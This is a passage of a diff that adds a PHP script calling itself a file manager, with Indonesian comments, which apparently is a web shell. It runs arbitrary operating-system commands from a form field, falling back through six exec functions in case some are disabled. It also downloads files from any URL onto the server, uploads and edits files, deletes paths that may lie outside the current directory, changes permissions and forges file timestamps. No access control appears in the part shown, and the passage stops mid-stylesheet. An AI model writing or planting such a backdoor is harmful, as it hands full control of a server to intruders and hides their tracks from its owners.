+    $dir = realpath($_POST['go_dir']);
+    if ($dir && is_dir($dir)) {
+        $_SESSION['current_dir'] = $dir;
+        unset($_SESSION['view_file'], $_SESSION['edit_file']);
+    }
+} elseif (!isset($_SESSION['current_dir'])) {
+    $_SESSION['current_dir'] = realpath(getcwd());
+}
+$current_dir = $_SESSION['current_dir'];
+
+// --- Melihat File ---
+if (isset($_POST['view_file'])) {
+    $vf = realpath($_POST['view_file']);
+    if ($vf && is_file($vf) && strpos($vf, $current_dir) === 0) {
+        $_SESSION['view_file'] = $vf;
+        unset($_SESSION['edit_file']);
+    }
+}
+
+// --- Mengedit File ---
+if (isset($_POST['edit_file'])) {
+    $ef = realpath($_POST['edit_file']);
+    if ($ef && is_file($ef) && strpos($ef, $current_dir) === 0) {
+        $_SESSION['edit_file'] = $ef;
+        unset($_SESSION['view_file']);
+    }
+}
+
+// --- Handle close view file ---
+if (isset($_POST['close_view_file'])) {
+    unset($_SESSION['view_file']);
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Touch File/Folder ---
+if (isset($_POST['touch_value'], $_POST['save_touch'])) {
+    $f = realpath($_POST['save_touch']);
+    $timestamp = strtotime($_POST['touch_value']);
+    
+    // Periksa apakah path yang diberikan adalah direktori saat ini atau direktori sebelumnya
+    $is_current_dir = ($f === realpath($current_dir));
+    $is_parent_dir = ($f === realpath(dirname($current_dir)));
+    
+    if ($f && (is_file($f) || is_dir($f)) && $timestamp !== false && ($is_current_dir || $is_parent_dir || (strpos($f, $current_dir) === 0))) {
+        if (touch($f, $timestamp)) {
+            $_SESSION['message'] = ['type' => 'success', 'text' => 'Timestamp updated successfully.'];
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to update timestamp.'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file/folder or timestamp format.'];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Simpan konten file yang diedit
+if (isset($_POST['edit_content'], $_POST['save_edit_file'])) {
+    $f = realpath($_POST['save_edit_file']);
+    if ($f && is_file($f) && is_writable($f) && strpos($f, $current_dir) === 0) {
+        // Mengizinkan konten kosong (string kosong)
+        $content = $_POST['edit_content']; // Bisa berupa string kosong
+        if (file_put_contents($f, $content) !== false) {
+            $_SESSION['message'] = ['type' => 'success', 'text' => 'File edited successfully.'];
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to edit file.'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file or not writable.'];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Penghapusan File dan Direktori ---
+function deleteDir($dir) {
+    if (!is_dir($dir)) return false;
+    $items = scandir($dir);
+    $success = true;
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $path = $dir . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($path)) {
+            if (!deleteDir($path)) $success = false;
+        } else {
+            if (!@unlink($path)) $success = false;
+        }
+    }
+    if (!@rmdir($dir)) $success = false;
+    return $success;
+}
+
+// Tangani penghapusan item tunggal
+if (isset($_POST['delete_single_item'])) {
+    $user_input_path = trim($_POST['delete_item_name']);
+    $path_to_actually_delete = null;
+
+    $potential_path_relative = $current_dir . DIRECTORY_SEPARATOR . $user_input_path;
+    $resolved_path_relative = realpath($potential_path_relative);
+    $resolved_path_absolute = realpath($user_input_path);
+
+    if ($resolved_path_relative && (is_file($resolved_path_relative) || is_dir($resolved_path_relative)) && strpos($resolved_path_relative, $current_dir) === 0) {
+        $path_to_actually_delete = $resolved_path_relative;
+    } else {
+        if ($resolved_path_absolute && (is_file($resolved_path_absolute) || is_dir($resolved_path_absolute))) {
+            $path_to_actually_delete = $resolved_path_absolute;
+        }
+    }
+
+    if ($path_to_actually_delete) {
+        if (is_dir($path_to_actually_delete)) {
+            if (deleteDir($path_to_actually_delete)) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => 'Folder "' . htmlspecialchars(basename($path_to_actually_delete)) . '" deleted successfully.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete folder "' . htmlspecialchars(basename($path_to_actually_delete)) . '".'];
+            }
+        } elseif (is_file($path_to_actually_delete)) {
+            if (@unlink($path_to_actually_delete)) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($path_to_actually_delete)) . '" deleted successfully.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete file "' . htmlspecialchars(basename($path_to_actually_delete)) . '".'];
+            }
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Item not found or not a valid file/folder.'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid path or item out of scope.'];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Ekstraksi ZIP Individual ---
+if (isset($_POST['extract_zip'])) {
+    $file_path = realpath($_POST['extract_zip']);
+    if ($file_path && is_file($file_path) && pathinfo($file_path, PATHINFO_EXTENSION) === 'zip' && strpos($file_path, $current_dir) === 0) {
+        $zip = new ZipArchive;
+        if ($zip->open($file_path) === TRUE) {
+            $extract_path = dirname($file_path);
+            if ($zip->extractTo($extract_path)) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($file_path)) . '" extracted successfully.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract file "' . htmlspecialchars(basename($file_path)) . '".'];
+            }
+            $zip->close();
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to open ZIP file "' . htmlspecialchars(basename($file_path)) . '".'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid ZIP file or out of scope.'];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Ekstraksi TAR.GZ Individual ---
+if (isset($_POST['extract_tar'])) {
+    $file_path = realpath($_POST['extract_tar']);
+    if ($file_path && is_file($file_path) && pathinfo($file_path, PATHINFO_EXTENSION) === 'gz' && substr($file_path, -7) === '.tar.gz' && strpos($file_path, $current_dir) === 0) {
+        try {
+            $phar = new PharData($file_path);
+            $extract_path = dirname($file_path);
+            if ($phar->extractTo($extract_path)) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($file_path)) . '" extracted successfully.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract file "' . htmlspecialchars(basename($file_path)) . '".'];
+            }
+            unset($phar);
+        } catch (Exception $e) {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract TAR.GZ file: ' . htmlspecialchars($e->getMessage())];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid TAR.GZ file or out of scope.'];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Get File dari URL ---
+if (isset($_POST['get_file_url'], $_POST['get_file_name'])) {
+    $url = trim($_POST['get_file_url']);
+    $filename = trim($_POST['get_file_name']);
+    
+    if (!empty($url) && !empty($filename)) {
+        $file_content = @file_get_contents($url);
+        
+        if ($file_content !== false) {
+            $target_path = $current_dir . DIRECTORY_SEPARATOR . $filename;
+            
+            if (file_put_contents($target_path, $file_content) !== false) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars($filename) . '" downloaded successfully.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to save file "' . htmlspecialchars($filename) . '".'];
+            }
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to download file from URL.'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'URL and filename are required.'];
+    }
+    
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Tindakan Massal ---
+if (isset($_POST['bulk_action'], $_POST['items']) && is_array($_POST['items'])) {
+    $clean_items = array();
+    $success_count = 0;
+    $fail_count = 0;
+    foreach ($_POST['items'] as $item_path) {
+        $r = realpath($item_path);
+        if ($r && strpos($r, $current_dir) === 0) {
+            $clean_items[] = $r;
+        }
+    }
+
+    switch ($_POST['bulk_action']) {
+        case 'delete':
+            foreach ($clean_items as $p) {
+                if (is_dir($p) ? deleteDir($p) : @unlink($p)) {
+                    $success_count++;
+                } else {
+                    $fail_count++;
+                }
+            }
+            if ($success_count > 0 && $fail_count == 0) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' item(s) deleted successfully.'];
+            } elseif ($success_count > 0 && $fail_count > 0) {
+                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' item(s) deleted, ' . $fail_count . ' failed.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to delete any items.'];
+            }
+            break;
+        case 'zip':
+            $zip_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.zip';
+            $zip = new ZipArchive();
+
+            if ($zip->open($zip_file_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
+                foreach ($clean_items as $p) {
+                    if (is_dir($p)) {
+                        $base_name = basename($p);
+                        $iterator = new RecursiveIteratorIterator(
+                            new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS),
+                            RecursiveIteratorIterator::SELF_FIRST
+                        );
+                        $zip->addEmptyDir($base_name);
+
+                        foreach ($iterator as $file) {
+                            $file_path = $file->getRealPath();
+                            $relative_path_in_zip = $base_name . DIRECTORY_SEPARATOR . substr($file_path, strlen($p) + 1);
+
+                            if ($file->isFile()) {
+                                $zip->addFile($file_path, $relative_path_in_zip);
+                            } elseif ($file->isDir()) {
+                                if ($file_path !== $p) {
+                                    $zip->addEmptyDir($relative_path_in_zip);
+                                }
+                            }
+                        }
+                    } else {
+                        $zip->addFile($p, basename($p));
+                    }
+                }
+                if ($zip->close()) {
+                    $_SESSION['message'] = ['type' => 'success', 'text' => 'Items compressed to compress.zip successfully.'];
+                } else {
+                    $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create zip archive.'];
+                }
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to open zip archive.'];
+            }
+            break;
+        case 'tar':
+            $tar_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.tar';
+            $tgz_file_path = $current_dir . DIRECTORY_SEPARATOR . 'compress.tar.gz';
+            try {
+                @unlink($tar_file_path); @unlink($tgz_file_path);
+                $phar = new PharData($tar_file_path);
+                foreach ($clean_items as $p) {
+                    $base_name = basename($p);
+                    if (is_dir($p)) {
+                        // Tambahkan folder utama ke arsip
+                        $phar->addEmptyDir($base_name);
+                        
+                        // Fungsi untuk menambahkan semua item dalam direktori
+                        $addItems = function($dir, $baseDir) use (&$phar, &$addItems) {
+                            $items = scandir($dir);
+                            foreach ($items as $item) {
+                                if ($item === '.' || $item === '..') continue;
+                                
+                                $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
+                                $relativePath = $baseDir . DIRECTORY_SEPARATOR . $item;
+                                
+                                if (is_dir($fullPath)) {
+                                    // Tambahkan folder ke arsip
+                                    $phar->addEmptyDir($relativePath);
+                                    // Rekursif untuk subfolder
+                                    $addItems($fullPath, $relativePath);
+                                } else {
+                                    // Tambahkan file ke arsip
+                                    $phar->addFile($fullPath, $relativePath);
+                                }
+                            }
+                        };
+                        
+                        // Mulai proses penambahan
+                        $addItems($p, $base_name);
+                    } else {
+                        // Untuk file biasa
+                        $phar->addFile($p, $base_name);
+                    }
+                }
+                if ($phar->compress(Phar::GZ)) {
+                    $_SESSION['message'] = ['type' => 'success', 'text' => 'Items compressed to compress.tar.gz successfully.'];
+                } else {
+                    $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to compress to tar.gz.'];
+                }
+                unset($phar);
+                @unlink($tar_file_path);
+            } catch (Exception $e) {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create tar.gz archive: ' . htmlspecialchars($e->getMessage())];
+            }
+            break;
+        case 'unzip':
+            $success_count = 0;
+            $fail_count = 0;
+            foreach ($clean_items as $p) {
+                if (is_file($p) && pathinfo($p, PATHINFO_EXTENSION) === 'zip') {
+                    $zip = new ZipArchive;
+                    if ($zip->open($p) === TRUE) {
+                        $extract_path = dirname($p);
+                        if ($zip->extractTo($extract_path)) {
+                            $success_count++;
+                        } else {
+                            $fail_count++;
+                        }
+                        $zip->close();
+                    } else {
+                        $fail_count++;
+                    }
+                } else {
+                    $fail_count++;
+                }
+            }
+            if ($success_count > 0 && $fail_count == 0) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' file(s) extracted successfully.'];
+            } elseif ($success_count > 0 && $fail_count > 0) {
+                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' file(s) extracted, ' . $fail_count . ' failed.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract any files.'];
+            }
+            break;
+        case 'untar':
+            $success_count = 0;
+            $fail_count = 0;
+            foreach ($clean_items as $p) {
+                if (is_file($p) && pathinfo($p, PATHINFO_EXTENSION) === 'gz' && substr($p, -7) === '.tar.gz') {
+                    try {
+                        $phar = new PharData($p);
+                        $extract_path = dirname($p);
+                        if ($phar->extractTo($extract_path)) {
+                            $success_count++;
+                        } else {
+                            $fail_count++;
+                        }
+                        unset($phar);
+                    } catch (Exception $e) {
+                        $fail_count++;
+                    }
+                } else {
+                    $fail_count++;
+                }
+            }
+            if ($success_count > 0 && $fail_count == 0) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => $success_count . ' file(s) extracted successfully.'];
+            } elseif ($success_count > 0 && $fail_count > 0) {
+                $_SESSION['message'] = ['type' => 'error', 'text' => $success_count . ' file(s) extracted, ' . $fail_count . ' failed.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to extract any files.'];
+            }
+            break;
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Pembuatan Folder Baru ---
+if (isset($_POST['newfolder_name'])) {
+    $new_folder_name = trim($_POST['newfolder_name']);
+    $full_path = $current_dir . DIRECTORY_SEPARATOR . $new_folder_name;
+    if ($new_folder_name && !file_exists($full_path) && strpos(realpath(dirname($full_path)), $current_dir) === 0) {
+        if (mkdir($full_path)) {
+            $_SESSION['message'] = ['type' => 'success', 'text' => 'Folder "' . htmlspecialchars($new_folder_name) . '" created successfully.'];
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create folder "' . htmlspecialchars($new_folder_name) . '".'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid folder name or already exists.'];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Pembuatan File Baru ---
+if (isset($_POST['create_file'])) {
+    $new_file_name = trim($_POST['newfile_name']);
+    $full_path = $current_dir . DIRECTORY_SEPARATOR . $new_file_name;
+    if ($new_file_name && !file_exists($full_path) && strpos(realpath(dirname($full_path)), $current_dir) === 0) {
+        if (file_put_contents($full_path, "") !== false) {
+            $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars($new_file_name) . '" created successfully.'];
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to create file "' . htmlspecialchars($new_file_name) . '".'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid file name or already exists.'];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Upload File ---
+if (isset($_FILES['uploadfile'])) {
+    $uf = $_FILES['uploadfile'];
+    if ($uf['error'] === UPLOAD_ERR_OK) {
+        $target_path = $current_dir . DIRECTORY_SEPARATOR . basename($uf['name']);
+        if (strpos(realpath(dirname($target_path)), $current_dir) === 0) {
+            if (move_uploaded_file($uf['tmp_name'], $target_path)) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => 'File "' . htmlspecialchars(basename($uf['name'])) . '" uploaded successfully.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to upload file "' . htmlspecialchars(basename($uf['name'])) . '".'];
+            }
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Upload target path out of scope.'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'File upload error: ' . $uf['error']];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Download File ---
+if (isset($_POST['download'])) {
+    $dl = realpath($_POST['download']);
+    if ($dl && is_file($dl) && strpos($dl, $current_dir) === 0) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($dl).'"');
+        readfile($dl);
+        exit;
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to download file: Invalid path or out of scope.'];
+        header("Location: " . $_SERVER['PHP_SELF']);
+        exit;
+    }
+}
+
+// --- Ganti Nama File/Folder ---
+if (isset($_POST['rename'], $_POST['rename_new'])) {
+    $o = realpath($_POST['rename']);
+    $n = basename($_POST['rename_new']);
+    if ($o && $n && strpos($o, $current_dir) === 0) {
+        $new_path = dirname($o) . DIRECTORY_SEPARATOR . $n;
+        if (strpos(realpath(dirname($new_path)), $current_dir) === 0) {
+            if (rename($o, $new_path)) {
+                $_SESSION['message'] = ['type' => 'success', 'text' => 'Item "' . htmlspecialchars(basename($o)) . '" renamed to "' . htmlspecialchars($n) . '" successfully.'];
+            } else {
+                $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to rename "' . htmlspecialchars(basename($o)) . '".'];
+            }
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'New path for rename is out of scope.'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid rename parameters or old path out of scope.'];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Ubah Izin File/Folder ---
+if (isset($_POST['chmod'], $_POST['chmod_value'])) {
+    $t = realpath($_POST['chmod']);
+    $cv = $_POST['chmod_value'];
+    
+    // Periksa apakah path yang diberikan adalah direktori saat ini atau direktori sebelumnya
+    $is_current_dir = ($t === realpath($current_dir));
+    $is_parent_dir = ($t === realpath(dirname($current_dir)));
+    
+    if ($t && preg_match('/^[0-7]{3,4}$/', $cv) && ($is_current_dir || $is_parent_dir || (strpos($t, $current_dir) === 0))) {
+        if (chmod($t, octdec($cv))) {
+            $_SESSION['message'] = ['type' => 'success', 'text' => 'Permissions for "' . htmlspecialchars(basename($t)) . '" changed to ' . htmlspecialchars($cv) . ' successfully.'];
+        } else {
+            $_SESSION['message'] = ['type' => 'error', 'text' => 'Failed to change permissions for "' . htmlspecialchars(basename($t)) . '".'];
+        }
+    } else {
+        $_SESSION['message'] = ['type' => 'error', 'text' => 'Invalid chmod parameters or path out of scope.'];
+    }
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// --- Eksekusi Perintah (Universal Windows/Linux Support) ---
+$cmdout = '';
+if (isset($_POST['command'])) {
+    $command = $_POST['command'];
+    
+    $exec_functions_closures = [
+        'system' => function($cmd) { ob_start(); system($cmd); return ob_get_clean(); },
+        'exec' => function($cmd) { $output = ''; exec($cmd, $output); return implode("\n", (array)$output); },
+        'passthru' => function($cmd) { ob_start(); passthru($cmd); return ob_get_clean(); },
+        'shell_exec' => function($cmd) { return shell_exec($cmd); },
+        'popen' => function($cmd) { 
+            $pipe = popen($cmd, 'r'); 
+            $output = ''; 
+            if (is_resource($pipe)) {
+                while (!feof($pipe)) $output .= fread($pipe, 1024);
+                pclose($pipe);
+            }
+            return $output;
+        },
+        'proc_open' => function($cmd) use ($current_dir) { 
+            $descriptorspec = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
+            $process = proc_open($cmd, $descriptorspec, $pipes, $current_dir);
+            if (is_resource($process)) {
+                fclose($pipes[0]);
+                $out = stream_get_contents($pipes[1]); fclose($pipes[1]);
+                $err = stream_get_contents($pipes[2]); fclose($pipes[2]);
+                proc_close($process);
+                return "Output:\n$out\nError:\n$err";
+            }
+            return false;
+        }
+    ];
+    
+    $output = '';
+    foreach ($exec_functions_closures as $func_name => $func_callback) {
+        if (function_exists($func_name)) {
+            $output = $func_callback($command);
+            if (!empty($output) && strlen(trim($output)) > 0) {
+                break;
+            }
+        }
+    }
+    
+    if (empty($output)) $output = "Command executed but no output returned or all functions disabled.";
+    $cmdout = "<pre>" . htmlspecialchars($output) . "</pre>";
+}
+
+// --- Handle AJAX request for file content ---
+if (isset($_GET['get_file_content'])) {
+    $file_path = realpath($_GET['get_file_content']);
+    if ($file_path && is_file($file_path) && strpos($file_path, $current_dir) === 0) {
+        echo file_get_contents($file_path);
+    }
+    exit;
+}
+
+// Definisikan fungsi execution untuk digunakan di HTML
+$exec_functions = [
+    'system' => function_exists('system'),
+    'exec' => function_exists('exec'), 
+    'passthru' => function_exists('passthru'),
+    'shell_exec' => function_exists('shell_exec'),
+    'popen' => function_exists('popen'),
+    'proc_open' => function_exists('proc_open')
+];
+
+// --- Fungsi Pembantu ---
+function permsToString($perms, $file_path, $current_uid, $current_gid) {
+    $info_chars_raw = '';
+
+    $owner_id = fileowner($file_path);
+    $group_id = filegroup($file_path);
+
+    $is_regular_file = (($perms & 0x8000) == 0x8000);
+    $is_writable_by_owner = (($perms & 0x0080) ? true : false);
+
+    if (($perms & 0xC000) == 0xC000) $info_chars_raw .= 's';
+    elseif (($perms & 0xA000) == 0xA000) $info_chars_raw .= 'l';
+    elseif (($perms & 0x8000) == 0x8000) $info_chars_raw .= '-';
+    elseif (($perms & 0x6000) == 0x6000) $info_chars_raw .= 'b';
+    elseif (($perms & 0x4000) == 0x4000) $info_chars_raw .= 'd';
+    elseif (($perms & 0x2000) == 0x2000) $info_chars_raw .= 'c';
+    elseif (($perms & 0x1000) == 0x1000) $info_chars_raw .= 'p';
+    else $info_chars_raw .= 'u';
+
+    $info_chars_raw .= (($perms & 0x0100) ? 'r' : '-');
+    $info_chars_raw .= (($perms & 0x0080) ? 'w' : '-');
+    $info_chars_raw .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+
+    $info_chars_raw .= (($perms & 0x0020) ? 'r' : '-');
+    $info_chars_raw .= (($perms & 0x0010) ? 'w' : '-');
+    $info_chars_raw .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+
+    $info_chars_raw .= (($perms & 0x0004) ? 'r' : '-');
+    $info_chars_raw .= (($perms & 0x0002) ? 'w' : '-');
+    $info_chars_raw .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+
+    $overall_perms_color_style = '';
+    if (($owner_id !== $current_uid && $current_uid !== null) || ($group_id !== $current_gid && $current_gid !== null)) {
+        $overall_perms_color_style = 'color: white;';
+    } else {
+        if ($is_writable_by_owner) {
+            $overall_perms_color_style = 'color: #00FF00;';
+        } else {
+            $overall_perms_color_style = 'color: red;';
+        }
+    }
+
+    $type_char = substr($info_chars_raw, 0, 1);
+    $colored_type_char = '';
+    if (($perms & 0xC000) == 0xC000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
+    elseif (($perms & 0xA000) == 0xA000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
+    elseif (($perms & 0x8000) == 0x8000) $colored_type_char = '<span style="color:white;">' . $type_char . '</span>';
+    elseif (($perms & 0x6000) == 0x6000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
+    elseif (($perms & 0x4000) == 0x4000) $colored_type_char = '<span style="color:#00FF00;">' . $type_char . '</span>';
+    elseif (($perms & 0x2000) == 0x2000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
+    elseif (($perms & 0x1000) == 0x1000) $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
+    else $colored_type_char = '<span style="color:#ADD8E6;">' . $type_char . '</span>';
+
+    return $colored_type_char . '<span style="' . $overall_perms_color_style . '">' . substr($info_chars_raw, 1) . '</span>';
+}
+
+function makeBreadcrumb($path) {
+    $path = realpath($path);
+    if ($path === false) return "";
+    $crumbs = array();
+    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
+    $acc = DIRECTORY_SEPARATOR;
+    $crumbs[] = '<form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars(DIRECTORY_SEPARATOR).'" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">/</button></form>';
+    $first = true;
+    foreach ($parts as $p) {
+        if (empty($p)) continue;
+        $acc .= $p;
+        if ($first) {
+            // Bagian pertama setelah root: tambahkan spasi di depan
+            $crumbs[] = ' <form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars($acc).'" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">'.htmlspecialchars($p).'</button></form>';
+            $first = false;
+        } else {
+            // Bagian berikutnya: tambahkan " /" di depan
+            $crumbs[] = ' / <form method="POST" style="display:inline"><button type="submit" name="go_dir" value="'.htmlspecialchars($acc).'" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">'.htmlspecialchars($p).'</button></form>';
+        }
+        $acc .= DIRECTORY_SEPARATOR;
+    }
+    return implode('', $crumbs);
+}
+
+function formatSize($b) {
+    if ($b>=1073741824) return number_format($b/1073741824,2)." GB";
+    if ($b>=1048576) return number_format($b/1048576,2)." MB";
+    if ($b>=1024) return number_format($b/1024,2)." KB";
+    return $b." B";
+}
+
+function getPermsOctal($filepath) {
+    return substr(decoct(fileperms($filepath)), -4);
+}
+
+$view_file = isset($_SESSION['view_file']) ? $_SESSION['view_file'] : null;
+$edit_file = isset($_SESSION['edit_file']) ? $_SESSION['edit_file'] : null;
+
+$view_content = null;
+if ($view_file && !$edit_file && is_file($view_file)) {
+    $view_content = file_get_contents($view_file);
+}
+$edit_content = null;
+if ($edit_file && is_file($edit_file)) {
+    $edit_content = file_get_contents($edit_file);
+}
 
 ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Manager PHP</title>
+    
+    <style>
+
+        body {
+            font-family: monospace;
+            background: black;
+            color: white;
+            margin: 0;
+            padding: 10px;
+            cursor: default;
+        }
+        button.action-btn {
+            background: #aa2222;
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            margin: 0;
+            cursor: pointer;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        button.action-btn:hover {
+            background: #dd4444;
+        }
+        .actions-cell form {
+            display: inline;
+            margin: 0;
+            padding: 0;
+        }
+        .actions-cell form:not(:last-child):after {
+            content: " | ";
+            color: #ff6666;
+            padding: 0 4px;
+        }
+        .actions-cell button:not(:last-child):after {
+            content: " | ";
+            color: #ff6666;
+            padding: 0 4px;
+        }
+        /* CSS khusus untuk bagian Viewing File */
+        .view-actions form:not(:last-child):after {
+            content: " ";
+            color: transparent;
+        }
+        .view-actions button:not(:last-child):after {
+            content: " ";
+            color: transparent;
+        }
+        .view-actions form, .view-actions button {
+            margin-right: 4px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
+        }
+        th, td {
+            border: 1px solid #444;
+            padding: 6px 8px;
+            text-align: left;
+            vertical-align: middle;
+        }
+        th {
+            background: #222;
+        }
+        tr:nth-child(even) {
+            background: #111;
+        }
+        .checkbox-col {
+            width: 22px;
+            text-align: center;
+        }
+        input[type=text], textarea {
+            background: black;
+            color: white;
+            border: 1px solid #444;
+            padding: 4px;
+            font-size: 14px;
+            cursor: text;
+        }
+        input[type=submit], input[type=button] {
+            background: #aa2222;
+            border: none;
+            color: white;
+            padding: 6px 12px;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+        input[type=submit]:hover, input[type=button]:hover {
+            background: #dd4444;
+        }
+        textarea {
+            width:100%;
+            height:400px;
+        }
+        .action-row {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-bottom: 15px;
+        }
+        .action-row form {
+            margin-right: 15px;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+        }
+        .action-row input[type="text"],
+        .action-row input[type="submit"] {
+            height: 30px;
+            vertical-align: middle;
+            box-sizing: border-box;
+            margin-right: 5px;
+        }
+        .action-row input[type="text"]:last-child,
+        .action-row input[type="submit"]:last-child {
+            margin-right: 0;
+        }
+        .command-form {
+            margin-top:20px;
+            margin-bottom:20px;
+        }
+        .file-content {
+            white-space: pre-wrap;
+            background:#111;
+            border:1px solid #444;
+            padding:10px;
+            margin-bottom:20px;
+            max-height: 400px;
+            overflow-y: auto;
+            cursor: text;
+        }
+        .edit-form, .touch-form {
+            margin-bottom: 20px;
+        }
+        .debug-message {
+            background-color: #333;
+            border: 1px solid #666;
+            padding: 10px;
+            margin-bottom: 15px;
+            color: #ffdd00;
+            font-size: 0.9em;
+        }
+        .user-group-diff {
+            color: white;
+        }
+        .perms-green {
+            color: #00FF00;
+        }
+        .perms-red {
+            color: red;
+        }
+        .perms-white {
+            color: white;
+        }
+        .touch-input {
+            width: 200px;
+            text-align: center;
+        }
+        .clickable-date {
+            cursor: pointer;
+            color: white;
+        }
+        .clickable-date:hover {
+            color: #ff6666;
+        }
+        .form-container {
+            display: none;
+            margin-bottom: 20px;
+            background: #111;
+            border: 1px solid #444;
+            padding: 15px;
+            border-radius: 5px;
